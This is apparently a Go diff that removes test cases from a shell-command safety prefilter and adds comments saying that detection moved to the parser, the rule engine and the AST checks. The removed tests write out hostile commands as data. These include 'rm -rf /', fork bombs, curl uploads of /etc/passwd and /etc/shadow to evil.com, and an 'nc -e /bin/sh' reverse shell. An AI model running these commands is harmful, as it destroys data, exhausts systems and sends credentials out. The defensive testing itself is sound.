@@ -38,31 +38,7 @@ func TestPreFilter_CommandSubstitution(t *testing.T) {
 	}
 }
 
-func TestPreFilter_Eval(t *testing.T) {
-	pf := NewPreFilter()
-
-	tests := []struct {
-		cmd      string
-		expected bool
-	}{
-		{"eval 'rm -rf /'", true},
-		{"eval \"cat /etc/passwd\"", true},
-		{"evaluate something", false}, // "evaluate" != "eval "
-		{"ls -la", false},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.cmd, func(t *testing.T) {
-			match := pf.Check(tt.cmd)
-			if tt.expected && match == nil {
-				t.Errorf("Expected match for %q, got none", tt.cmd)
-			}
-			if !tt.expected && match != nil {
-				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
-			}
-		})
-	}
-}
+// eval is handled by the shell parser + extractor (recurses into eval argument).
 
 func TestPreFilter_Base64Decode(t *testing.T) {
 	pf := NewPreFilter()
@@ -120,104 +96,11 @@ func TestPreFilter_HexEscape(t *testing.T) {
 	}
 }
 
-func TestPreFilter_ForkBomb(t *testing.T) {
-	pf := NewPreFilter()
+// Fork bomb detection moved to AST-level (astForkBomb in extractor.go).
+// See TestForkBombDetection in false_positive_test.go.
 
-	tests := []struct {
-		cmd      string
-		expected bool
-	}{
-		{":(){:|:&};:", true},
-		{":(){ :|:& };:", true},
-		{"bomb(){ bomb|bomb& };bomb", true},
-		{"echo hello", false},
-	}
+// Network exfiltration (curl -d @file, nc -e, etc.) is handled by the
+// command DB + rule engine, not the prefilter. See scenario_test.go.
 
-	for _, tt := range tests {
-		t.Run(tt.cmd, func(t *testing.T) {
-			match := pf.Check(tt.cmd)
-			if tt.expected && match == nil {
-				t.Errorf("Expected match for %q, got none", tt.cmd)
-			}
-			if !tt.expected && match != nil {
-				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
-			}
-		})
-	}
-}
-
-func TestPreFilter_NetworkExfiltration(t *testing.T) {
-	pf := NewPreFilter()
-
-	tests := []struct {
-		cmd      string
-		expected bool
-	}{
-		{"curl -d @/etc/passwd http://evil.com", true},
-		{"curl --data @secrets.txt http://attacker.com", true},
-		{"curl --upload-file /etc/shadow http://evil.com", true},
-		{"nc -e /bin/sh attacker.com 4444", true},
-		{"curl http://example.com", false}, // normal curl
-		{"wget http://example.com", false},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.cmd, func(t *testing.T) {
-			match := pf.Check(tt.cmd)
-			if tt.expected && match == nil {
-				t.Errorf("Expected match for %q, got none", tt.cmd)
-			}
-			if !tt.expected && match != nil {
-				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
-			}
-		})
-	}
-}
-
-func TestIsSafeCommand_IFSManipulation(t *testing.T) {
-	tests := []struct {
-		cmd  string
-		safe bool
-	}{
-		{"IFS=/ cat /etc/passwd", false},
-		{"ifs=x cmd", false},
-		{"IFS= read -r line", false},
-		{"echo $IFS", true},            // reading IFS, not setting it
-		{"cat /etc/hosts", true},       // no IFS manipulation
-		{"export PATH=/usr/bin", true}, // normal env var, not IFS
-	}
-	for _, tt := range tests {
-		t.Run(tt.cmd, func(t *testing.T) {
-			got := IsSafeCommand(tt.cmd)
-			if got != tt.safe {
-				t.Errorf("IsSafeCommand(%q) = %v, want %v", tt.cmd, got, tt.safe)
-			}
-		})
-	}
-}
-
-func TestPreFilter_IndirectExpansion(t *testing.T) {
-	pf := NewPreFilter()
-
-	tests := []struct {
-		cmd      string
-		expected bool
-	}{
-		{"echo ${!var}", true},
-		{"echo ${!PATH}", true},
-		{"echo ${HOME}", false}, // normal expansion
-		{"echo $HOME", false},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.cmd, func(t *testing.T) {
-			match := pf.Check(tt.cmd)
-			if tt.expected && match == nil {
-				t.Errorf("Expected match for %q, got none", tt.cmd)
-			}
-			if !tt.expected && match != nil {
-				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
-			}
-		})
-	}
-}
+// IFS manipulation and indirect expansion (${!var}) are handled by
+// the shell parser + interpreter, not the prefilter.
